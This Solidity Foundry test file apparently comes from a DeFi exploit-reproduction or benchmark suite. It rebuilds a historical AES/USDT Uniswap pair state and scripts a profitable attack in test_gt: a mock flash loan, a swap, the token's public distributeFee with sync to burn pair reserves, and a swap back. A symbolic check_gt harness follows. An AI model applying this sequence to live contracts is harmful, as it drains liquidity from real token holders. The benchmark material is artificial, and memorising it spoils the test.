// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AES.sol";
import "./AttackContract.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract AESTest is Test, BlockLoader {
    AES aes;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address aesAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1670403423;
    uint112 reserve0pair = 64026931732834970073285;
    uint112 reserve1pair = 3976072419420817555481090;
    uint32 blockTimestampLastpair = 1670402979;
    uint256 kLastpair = 250000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 8186339539916590645979676076811473439021;
    uint256 price1CumulativeLastpair = 1309036025684247482259206283363904562;
    uint256 totalSupplyaes = 80966356010303897340499440;
    uint256 balanceOfaespair = 3976072419420817555481090;
    uint256 balanceOfaesattacker = 0;
    uint256 balanceOfaes = 0;
    uint256 totalSupplyusdt = 3179997922170098408283525081;
    uint256 balanceOfusdtpair = 64026931732834970073285;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdt = 0;

    function setUp() public {
        owner = address(this);
        aes = new AES(
            "AES",
            "AES",
            address(usdt),
            [
                0xEb55526075eC7797d5CdcF4C3263fA39004B958D,
                0x05DE4Ea6D2472EB569B55e6A1Ada52d2a451d854,
                0x7c31f5c790CeA93d83aD94F92037Abc1c0d5740d,
                0x3E1BA8607304EdC3d26eA6Fba67C09cEb2890AcA,
                0x3777aeec31907057c16F0b4dDC34A6B0a5dC53b6
            ]
        );
        aesAddr = address(aes);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(aes),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        aes.transfer(address(pair), balanceOfaespair);
        aes.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(aes), address(usdt), aes.decimals());
        emit log_string("");
        emit log_string("Aes Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(aes), usdt.decimals());
        queryERC20BalanceDecimals(address(aes), address(aes), aes.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(aes), address(pair), aes.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(aes),
            address(attacker),
            aes.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_aes_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        aes.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_aes_owner(uint256 amount) internal eurus {
        aes.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_aes_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        aes.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_aes_pair(uint256 amount) internal eurus {
        aes.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_aes(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_aes_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        aes.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_aes_pair(uint256 amount) internal eurus {
        aes.distributeFee();
        pair.sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(0x2089c33dbe52a6000000);
        printBalance("After step0 ");
        emit log_named_uint("A", pair.getAmountOut(usdt.balanceOf(attacker), address(usdt)));
        swap_pair_attacker_usdt_aes(
            0x2089bac938c4ae000000,
            0x251cb496680f640000000
        );
        printBalance("After step1 ");
        burn_aes_pair(0xde0b6b3a7640000);
        printBalance("After step2 ");
        emit log_named_uint("A", aes.balanceOf(attacker));
        emit log_named_uint("A", pair.getAmountOut(0xde0b6b3a7640000, address(aes)) * 9 / 10);
        swap_pair_attacker_aes_usdt(
            0xde0b6b3a7640000,
            0x24dad4d0ee39b0000000
        );
        printBalance("After step3 ");
        payback_usdt_owner(0x20a2c0e6bfd714000000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= (amt0 * 1003) / 1000);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_aes(amt1, amt2);
        burn_aes_pair(amt3);
        swap_pair_attacker_aes_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
